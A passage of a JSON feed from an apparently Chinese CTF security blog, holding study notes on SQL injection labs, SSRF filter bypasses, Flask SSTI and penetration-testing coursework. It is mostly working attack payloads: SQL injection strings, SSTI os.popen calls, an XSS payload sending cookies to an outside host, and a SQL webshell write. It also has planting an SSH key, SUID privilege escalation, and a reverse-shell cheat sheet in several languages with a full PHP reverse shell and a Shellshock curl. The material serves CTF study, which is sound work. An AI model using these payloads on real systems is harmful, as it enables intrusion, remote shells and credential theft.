title=\"less 8\"></a>less 8</h1><p>同 less 5</p>\n<h1 id=\"less-9\"><a href=\"#less-9\" class=\"headerlink\" title=\"less 9\"></a>less 9</h1><p>不管什么都显示相同，故采用时间盲注 </p>\n<p>payload：<code>?id=1' and if(ascii(substr({},{},1))={},sleep(1),2)--+</code></p>\n<h1 id=\"less-10\"><a href=\"#less-10\" class=\"headerlink\" title=\"less 10\"></a>less 10</h1><p>第九题改单引号为双引号</p>\n<h1 id=\"less-11\"><a href=\"#less-11\" class=\"headerlink\" title=\"less 11\"></a>less 11</h1><p>联合查询</p>\n<p>payload</p>\n<pre><code class=\"sql\">passwd=admin&amp;uname=' union select 1,database()--+\npasswd=admin&amp;uname=' union select 1,(select group_concat(table_name)from information_schema.tables where table_schema='security')--+\n</code></pre>\n<p>或者使用报错注入</p>\n<pre><code class=\"sql\">passwd=1&amp;uname=1' and updatexml(0x7e,concat(0x7e,database()),0x7e)--+\n或者\npasswd=1&amp;uname=1'union (select 1,2 from(select count(*),concat((select (select (select concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema='security'),0x7e)))from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23\n</code></pre>\n<h1 id=\"less-12\"><a href=\"#less-12\" class=\"headerlink\" title=\"less 12\"></a>less 12</h1><p>与 11 相比，闭合使用 <code>\")</code></p>\n<p>其他同</p>\n<h1 id=\"less-13\"><a href=\"#less-13\" class=\"headerlink\" title=\"less 13\"></a>less 13</h1><p>闭合使用 <code>')</code> ，使用报错注入，其他无显示</p>\n",
            "tags": [
                "CTF",
                "sql注入"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/813434ca/",
            "url": "http://dpm12345.cn/posts/813434ca/",
            "title": "SSRF",
            "date_published": "2022-09-09T12:56:46.000Z",
            "content_html": "<h1 id=\"对于-IP-的绕过\"><a href=\"#对于-IP-的绕过\" class=\"headerlink\" title=\"对于 IP 的绕过\"></a>对于 IP 的绕过</h1><h2 id=\"绕过姿势\"><a href=\"#绕过姿势\" class=\"headerlink\" title=\"绕过姿势\"></a>绕过姿势</h2><ul>\n<li><p>更改IP地址写法 例如<code>192.168.0.1</code></p>\n<ul>\n<li>8进制格式：<code>0300.0250.0.1</code></li>\n<li>16进制格式：<code>0xC0.0xA8.0.1</code></li>\n<li>10进制整数格式：<code>3232235521</code></li>\n<li>16进制整数格式：<code>0xC0A80001</code></li>\n<li>还有一种特殊的省略模式，例如<code>10.0.0.1</code>这个IP可以写成<code>10.1</code></li>\n</ul>\n</li>\n<li><p>利用URL解析问题，在某些情况下，后端程序可能会对访问的 URL 进行解析，对解析出来的 host 地址进行过滤。这时候可能会出现对 URL 参数解析不当，导致可以绕过过滤。 例如：</p>\n<ul>\n<li><p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5iYWlkdS5jb21AMTkyLjE2OC4wLjEv\">http://www.baidu.com@192.168.0.1/</span> 与 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xLw==\">http://192.168.0.1</span> 请求的都是<code>192.168.0.1</code>的内容</p>\n</li>\n<li><p>可以指向任意ip的域名<code>xip.io</code>： <span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS54aXAuaW8v\">http://127.0.0.1.xip.io/</span> ==&gt; <span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS8=\">http://127.0.0.1/</span></p>\n</li>\n<li><p>短地址 <span class=\"exturl\" data-url=\"aHR0cDovL2R3ei5jbi8xMVNNYQ==\">http://dwz.cn/11SMa</span> ==&gt; <span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS8=\">http://127.0.0.1</span></p>\n</li>\n<li><p>利用句号<code>。</code>：<code>127。0。0。1</code>==&gt;<code>127.0.0.1</code></p>\n</li>\n<li><p>利用 Enclosed alphanumerics</p>\n<pre><code class=\"raw\">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com\nList:\n① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ \n⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ \n⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ \n⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ \nⒶ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ \nⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ \n⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ \n⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿\n</code></pre>\n</li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "CTF",
                "SSRF"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/47d18edd/",
            "url": "http://dpm12345.cn/posts/47d18edd/",
            "title": "SSTI",
            "date_published": "2022-09-09T12:56:46.000Z",
            "content_html": "<pre><code class=\"raw\">__class__            类的一个内置属性，表示实例对象的类。\n \n__base__             类型对象的直接基类\n \n__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__\n \n__mro__              method resolution order，即解析方法调用的顺序；此属性是由类组成的元组，在方法解析期间会基于它来查找基类。\n \n__subclasses__()     返回这个类的子类集合，每个类都保留一个对其直接子类的弱引用列表。该方法返回一个列表，其中包含所有仍然存在的引用。列表按照定义顺序排列。\n \n__init__             初始化类，返回的类型是function\n \n__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。\n \n__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里\n \n__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。\n \n__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')\n \n__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。\n \n__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]\n \n__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。\n \nurl_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。\n \nget_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。\n \nlipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}\n \ncurrent_app          应用上下文，一个全局变量。\n \nrequest              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\\self\\fd/3').read()\n \nrequest.args.x1   \t get传参\n \nrequest.values.x1 \t 所有参数\n \nrequest.cookies      cookies参数\n \nrequest.headers      请求头参数\n \nrequest.form.x1   \t post传参\t(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)\n \nrequest.data  \t\t post传参\t(Content-Type:a/b)\n \nrequest.json\t\t post传json  (Content-Type: application/json)\n \nconfig               当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}\n \ng                    {{g}}得到&lt;flask.g of 'flask_ssti'&gt;\n</code></pre>\n<p>常用过滤器</p>\n<pre><code class=\"raw\">int()：将值转换为int类型；\n \nfloat()：将值转换为float类型；\n \nlower()：将字符串转换为小写；\n \nupper()：将字符串转换为大写；\n \ntitle()：把值中的每个单词的首字母都转成大写；\n \ncapitalize()：把变量值的首字母转成大写，其余字母转小写；\n \ntrim()：截取字符串前面和后面的空白字符；\n \nwordcount()：计算一个长字符串中单词的个数；\n \nreverse()：字符串反转；\n \nreplace(value,old,new)： 替换将old替换为new的字符串；\n \ntruncate(value,length=255,killwords=False)：截取length长度的字符串；\n \nstriptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；\n \nescape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。\n \nsafe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'<em>hello</em>'|safe}}；\n \nlist()：将变量列成列表；\n \nstring()：将变量转换成字符串；\n \njoin()：将一个序列中的参数值拼接成字符串。示例看上面payload；\n \nabs()：返回一个数值的绝对值；\n \nfirst()：返回一个序列的第一个元素；\n \nlast()：返回一个序列的最后一个元素；\n \nformat(value,arags,*kwargs)：格式化字符串。比如：{{ \"%s\" - \"%s\"|format('Hello?',\"Foo!\") }}将输出：Helloo? - Foo!\n \nlength()：返回一个序列或者字典的长度；\n \nsum()：返回列表内数值的和；\n \nsort()：返回排序后的列表；\n \ndefault(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。\n \nlength()返回字符串的长度，别名是count\n</code></pre>\n",
            "tags": [
                "CTF",
                "SSTI"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/5463b311/",
            "url": "http://dpm12345.cn/posts/5463b311/",
            "title": "信息安全铁人三项学习",
            "date_published": "2022-08-31T06:16:37.000Z",
            "content_html": "<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/target.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_1.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_2.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_3.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_4.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_5.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_6.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_7.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_8.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_9.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_10.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_11.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_12.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_13.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_14.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_15.jpg\" alt=\"\"></p>\n<p>nessus</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>/bin/systemctl start nessusd.service</pre></td></tr></tbody></table></figure><h1 id=\"提权分类\"><a class=\"anchor\" href=\"#提权分类\">#</a> 提权分类</h1>\n<ul>\n<li>数据库提权：udf 提权、mof 提权、反弹端口链接提权等</li>\n<li>web 提权：SQL 注入提权、webshell 提权、web 中间件提权等</li>\n<li>操作系统提权：系统内核溢出提权、错误的系统配置提权、组策略首选项提权、DLL 劫持提权、第三方软件提权</li>\n<li>安卓提权等</li>\n</ul>\n<h1 id=\"23-综合渗透之-suid-提权\"><a class=\"anchor\" href=\"#23-综合渗透之-suid-提权\">#</a> 2.3 综合渗透之 SUID 提权</h1>\n<h2 id=\"xss-绕过-csp-获取登陆-cookie\"><a class=\"anchor\" href=\"#xss-绕过-csp-获取登陆-cookie\">#</a> XSS 绕过 CSP 获取登陆 cookie</h2>\n<p>CSP 是由单词 Content Security Policy 的首单词组成，CSP 旨在减少 (注意这里是减少而不是消灭) 跨站脚本攻击。</p>\n<p>找到 XSS 注入点，输入</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token script\"><span class=\"token language-javascript\">window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"http://ip/任意文件名?=\"</span><span class=\"token operator\">+</span>document<span class=\"token punctuation\">.</span>cookie<span class=\"token punctuation\">;</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr></tbody></table></figure><p>由此可以获得 cookie 值</p>\n<p>之后转到登陆界面，输入 cookie 值，来到管理员界面（可能为 /admin 目录）</p>\n<h2 id=\"利用-sql-注入写一句话木马\"><a class=\"anchor\" href=\"#利用-sql-注入写一句话木马\">#</a> 利用 sql 注入写一句话木马</h2>\n<p>在界面中，观察 url 的形式，找到注入点</p>\n<p>输入  <code>union select 1,2,3</code>  先确认输出位置点</p>\n<p>再根据 sql 命令 <code>and select 1,select 0x[一句话木马的hex编码],3 into outfile \"/var/www/html/1.php\"</code>  写入一句话木马</p>\n<p>(若无法写入，可尝试更换目录)</p>\n<p>写入后，访问观察是否成功，之后使用蚁剑连接，使用提供的终端 <code>whoami</code>  获取用户</p>\n<h2 id=\"利用-ssh-来获得低权限\"><a class=\"anchor\" href=\"#利用-ssh-来获得低权限\">#</a> 利用 ssh 来获得低权限</h2>\n<p>使用 <code>ssh-keygen -t rsa</code>  在本地生成一个 <code>id_rsa.pub</code> , 之后将该文件复制，更名为 <code>authorized_keys</code> , 利用菜刀工具上传到目标机服务器上的 <code>.ssh</code>  文件夹中，然后本地 <code>ssh用户名@ip</code>  登陆低权限用户</p>\n<h2 id=\"利用-suid-获取高权限\"><a class=\"anchor\" href=\"#利用-suid-获取高权限\">#</a> 利用 SUID 获取高权限</h2>\n<p>如果设置了 SUID 这个标志位，普通权限的程序在执行的时候，可以暂时拥有 root 权限、</p>\n<p>已知的可以用来提权的 Linux 可执行文件有:</p>\n<ul>\n<li>Nmap</li>\n<li>Vim</li>\n<li>find</li>\n<li>Bash</li>\n<li>More</li>\n<li>Less</li>\n<li>Nano</li>\n<li>cp</li>\n</ul>\n<p>下面的命令可以发现所有的系统中运行的 SUID 可执行文件</p>\n<p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p>\n<p><code>find / -user root -perm -4000-exec ls -ldb {} ;</code></p>\n<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>\n<p>执行以下命令，可以看到，当前的权限是 root</p>\n<p><code>/usr/bin/find test -exec whoami \\;</code></p>\n<p>其他可见 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8=\">https://gtfobins.github.io</span></p>\n<p>通过其，可以修改配置文件</p>\n<h2 id=\"反弹-shell\"><a class=\"anchor\" href=\"#反弹-shell\">#</a> 反弹 shell</h2>\n<p>python</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>python <span class=\"token operator\">-</span>c <span class=\"token string\">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'</span></pre></td></tr></tbody></table></figure><p>perl</p>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>perl <span class=\"token operator\">-e</span> <span class=\"token string\">'use Socket;$i=\"10.10.14.23\";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'</span></pre></td></tr></tbody></table></figure><p>php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'nc -e /bin/bash 10.10.14.6 4444'</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?&gt;</span></span>  //html版 </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1'\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span>    </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>&amp;3</span> <span class=\"token punctuation\">&gt;</span></span>&amp;3 2&gt;&amp;3\");'    //内置语言版</pre></td></tr></tbody></table></figure><p>html 无 nc 版</p>\n<pre><code class=\"language-php+HTML\">\n&lt;?php \nset_time_limit(0);\n$VERSION = \"1.0\";\n$ip = \"10.10.14.6\";\n$port = 4444;\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = \"uname -a; w; id; /bin/bash -i\";\n$daemon = 0;\n$debug = 0;\nif (function_exists(\"pcntl_fork\")) {\n    $pid = pcntl_fork();\n    if ($pid == -1) {\n        printit(\"ERROR: Cannot fork\");\n        exit(1);\n    }\n    if ($pid) {\n        exit(0);\n    }\n    if (posix_setsid() == -1) {\n        printit(\"Error: Cannot setsid()\");\n        exit(1);\n    }\n    $daemon = 1;\n} else {\n    printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\nchdir(\"/\");\numask(0);\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n    printit(\"$errstr ($errno)\");\n    exit(1);\n}\n$descriptorspec = array(0 =&gt; array(\"pipe\", \"r\"), 1 =&gt; array(\"pipe\", \"w\"), 2 =&gt; array(\"pipe\", \"w\"));\n$process = proc_open($shell, $descriptorspec, $pipes);\nif (!is_resource($process)) {\n    printit(\"ERROR: Cannot spawn shell\");\n    exit(1);\n}\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\nprintit(\"Successfully opened reverse shell to $ip:$port\");\nwhile (1) {\n    if (feof($sock)) {\n        printit(\"ERROR: Shell connection terminated\");\n        break;\n    }\n    if (feof($pipes[1])) {\n        printit(\"ERROR: Shell process terminated\");\n        break;\n    }\n    $read_a = array($sock, $pipes[1], $pipes[2]);\n    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n    if (in_array($sock, $read_a)) {\n        if ($debug) printit(\"SOCK READ\");\n        $input = fread($sock, $chunk_size);\n        if ($debug) printit(\"SOCK: $input\");\n        fwrite($pipes[0], $input);\n    }\n    if (in_array($pipes[1], $read_a)) {\n        if ($debug) printit(\"STDOUT READ\");\n        $input = fread($pipes[1], $chunk_size);\n        if ($debug) printit(\"STDOUT: $input\");\n        fwrite($sock, $input);\n    }\n    if (in_array($pipes[2], $read_a)) {\n        if ($debug) printit(\"STDERR READ\");\n        $input = fread($pipes[2], $chunk_size);\n        if ($debug) printit(\"STDERR: $input\");\n        fwrite($sock, $input);\n    }\n}\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\nfunction printit($string)\n{\n    if (!$daemon) {\n        print \"$string\\n\";\n    }\n} ?&gt;\n</code></pre>\n<p>curl</p>\n<figure class=\"highlight powershell\"><figcaption data-lang=\"PowerShell\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>curl <span class=\"token operator\">-</span>H <span class=\"token string\">'Cookie: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.23/4443 0&gt;&amp;1'</span> http:<span class=\"token operator\">/</span><span class=\"token operator\">/</span>10<span class=\"token punctuation\">.</span>10<span class=\"token punctuation\">.</span>10<span class=\"token punctuation\">.</span>56/cgi-bin/user<span class=\"token punctuation\">.</span>sh`</pre></td></tr></tbody></table></figure><p>bash</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>/bash <span class=\"token parameter variable\">-i</span> <span class=\"token operator\">&gt;&amp;</span> /dev/tcp/10.10.14.23/4444 <span class=\"token operator\"><span class=\"token file-descriptor important\">0</span>&gt;</span><span class=\"token file-descriptor important\">&amp;1</span></pre></td></tr></tbody></table></figure><p>nc</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>nc -e /bin/sh 10.0.0.1 1234</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>// 若是机器上安装的 nc 版本没有 - e 选项</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</pre></td></tr></tbody></table></figure><p>Ruby</p>\n<figure class=\"highlight ruby\"><figcaption data-lang=\"ruby\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">/</span><span class=\"token operator\">/</span>依赖<span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span>sh<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>ruby <span class=\"token operator\">-</span>rsocket <span class=\"token operator\">-</span>e<span class=\"token string-literal\"><span class=\"token string\">'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)'</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">/</span><span class=\"token operator\">/</span>不依赖：</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>ruby <span class=\"token operator\">-</span>rsocket <span class=\"token operator\">-</span>e <span class=\"token string-literal\"><span class=\"token string\">'exit if fork;c=TCPSocket.new(\"attackerip\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'</span></span></pre></td></tr></tbody></table></figure><p>sh 文件</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">'#!/bin/bash\\n\\nbash -i &gt;&amp; /dev/tcp/10.10.14.2/4445 0&gt;&amp;1'</span> <span class=\"token operator\">&gt;</span> xxx.sh</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">bash</span> xxx.sh</pre></td></tr></tbody></table></figure><p>二、调取 shell 的各种方式</p>\n<p>perl</p>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span>perl <span class=\"token operator\">-e</span> <span class=\"token string\">'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash\";'</span></pre></td></tr></tbody></table></figure><p>python （获取交互式 shell）</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>python <span class=\"token parameter variable\">-c</span> <span class=\"token string\">'import pty; pty.spawn(\"/bin/bash\")'</span></pre></td></tr></tbody></table></figure><p>原文链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc3NteHIvYXJ0aWNsZS9kZXRhaWxzLzEyMTQ2Mzc2Ng==\">https://blog.csdn.net/missmxr/article/details/121463766</span></p>\n<h1 id=\"24-综合渗透之-udf-提权\"><a class=\"anchor\" href=\"#24-综合渗透之-udf-提权\">#</a> 2.4 综合渗透之 UDF 提权</h1>\n<h2 id=\"信息搜集\"><a class=\"anchor\" href=\"#信息搜集\">#</a> 信息搜集</h2>\n<ul>\n<li>\n<p>寻找常见目录 (robots.txt,phpinfo.php,phpmyadmin), 使用 dirsearch 扫</p>\n</li>\n<li>\n<p>Whios 信息查询：站长之家，kali</p>\n</li>\n<li>\n<p>服务器信息：脚本、框架、中间件版本</p>\n</li>\n<li>\n<p>子域名挖掘，旁站，c 段</p>\n</li>\n<li>\n<p>端口：nmap，在线工具，，</p>\n</li>\n<li>\n<p>真实 ip：有 cdn，使用 ping、二级域名、nslookup 等，或者 DDos 打完 cdn 流量</p>\n</li>\n</ul>\n<h2 id=\"讲解的环境从-phpmyadmin即数据库登陆入手\"><a class=\"anchor\" href=\"#讲解的环境从-phpmyadmin即数据库登陆入手\">#</a> 讲解的环境，从 phpmyadmin，即数据库登陆入手</h2>\n<h3 id=\"利用-phpadmin-漏洞\"><a class=\"anchor\" href=\"#利用-phpadmin-漏洞\">#</a> 利用 phpadmin 漏洞</h3>\n<p>一、影响版本：3.5.x &lt; 3.5.8.1 and 4.0.0 &lt; 4.0.0-rc3</p>\n<p>概述：phpmyadmin 存在 PREG_REPLACE_EVAL 漏洞</p>\n<p>利用模块：exploit/multi/http/phpmyadmin_preg_replace</p>\n<p>CVE：CVE-2013-3238</p>\n<p>二、影响版本：v3.5.2.2</p>\n<p>概述：phpmyadmin 存在 server_sync.PHP 